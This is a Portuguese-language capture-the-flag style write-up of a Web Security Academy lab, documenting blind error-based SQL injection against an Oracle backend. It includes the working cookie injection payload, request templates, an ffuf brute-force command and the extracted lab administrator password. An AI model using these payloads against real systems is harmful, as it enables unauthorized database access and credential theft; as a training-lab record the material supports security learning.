## Objetivo
Enumerar a senha do administrator via blind SQLi baseado em erros condicionais em banco Oracle.
descobri o DB testando, primeiro tentei sintaxe para MySQL e n deu certo, aí tentei para oracle e funcionou.

## Vulnerabilidade Identificada
O database é vulneravel a blind SQLi. fiz o teste identificando com ``'||(SELECT CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE 'a' END FROM dual)||'`` 
quando verdadeiro divide 1/0 e da error 500 no DB
<br>
<img width="1854" height="775" alt="Screenshot From 2026-04-29 10-12-39" src="https://github.com/user-attachments/assets/6315ca99-b121-487a-91d9-f0824dfdf275" />

<br>

`` WHEN (1=2)...'`` quando falso retorna 200 ok
<br>
<img width="1854" height="775" alt="Screenshot From 2026-04-29 10-12-28" src="https://github.com/user-attachments/assets/64590ca9-c8f8-455a-9ab9-4a70cc61d136" />

<br>

## Metodologia
Após criar uma wordlist de a-z, 0-9 & A-Z; chamada de testefuz.txt
criei uma req.txt para alocar o header do cookie com o SQLi 
Após isso rodei a ffuf attack-line com -mc 500 para filtrar TRUE
fiz posição por posição até posição 21 retornar falso.

## Comandos Utilizados

req.txt
```bash
GET / HTTP/1.1
Host: 0ad5004903bbf45b838d6ecf00120090.web-security-academy.net
Cookie: TrackingId=XOqI8SzaKowydEzs'||(SELECT CASE WHEN (SUBSTR(password, 1, 1) = 'FUZZ') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')||'; session=eYt28e3KeMSlCvzIeu3m4mkqxuapQagh
```

ffuf attack-line
```bash
ffuf -w /home/luweed/Documents/testefuz.txt:FUZZ \
     -request /home/luweed/Documents/req.txt \
     -request-proto https \
     -mc 500
```

ultima req.txt (retornou falso)
```bash
GET / HTTP/1.1
Host: 0ad5004903bbf45b838d6ecf00120090.web-security-academy.net
Cookie: TrackingId=XOqI8SzaKowydEzs'||(SELECT CASE WHEN (SUBSTR(password, 21, 1) = 'FUZZ') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')||'; session=eYt28e3KeMSlCvzIeu3m4mkqxuapQagh
```


## Resultado
user: administrator   password:b26xmd3fbxjwuwm3rg5g

## Lições Aprendidas

Aprendi a usar ffuf para fazer enumeração de senha com blind SQLi a paritr de condicionais de erro. 
Também aprendi a identificar o tipo de banco testando sintaxes diferentes
Apesar que eu sei que o sqlmap é capaz de automatizar esses tipos de tarefa. 
foi importante porque aprendi a lógica por trás e a como testar se o parâmetro está sem sanitização fazendo uma injeção simples de verdadeiro ou falso  




